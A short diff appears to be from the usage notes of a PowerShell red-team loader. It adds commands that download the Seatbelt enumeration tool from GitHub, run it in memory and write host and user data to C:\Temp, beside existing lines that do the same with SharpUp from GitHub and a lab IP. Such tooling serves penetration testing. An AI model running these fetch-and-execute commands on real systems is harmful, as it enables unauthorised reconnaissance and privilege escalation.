@@ -20,4 +20,7 @@ Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blo
 Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpUpNew.exe -Command "audit"
 Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpUp.exe?raw=true -Command "audit"
 
+Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/Seatbelt.exe?raw=true -Command "-group=user -outputfile=C:\\Temp\\out.txt"
+Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/Seatbelt.exe?raw=true -Command "-group=all -full -outputfile=C:\Temp\out.txt"
+
 ```
